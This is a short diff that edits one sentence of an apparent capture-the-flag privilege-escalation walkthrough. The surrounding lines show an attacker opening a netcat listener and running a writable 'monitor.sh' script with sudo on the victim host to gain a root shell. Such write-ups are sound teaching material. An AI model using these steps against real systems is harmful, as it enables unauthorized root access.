@@ -288,7 +288,7 @@ We open a new necat listener on our host (attacker):
 $ nc -lvnp 1235
 ```
 
-And we execute the `monitor.sh` script as sudo in the target (victim) host:
+And we execute the `monitor.sh` script with sudo in the target (victim) host:
 
 ```
 $ sudo /home/nibbler/personal/stuff/monitor.sh
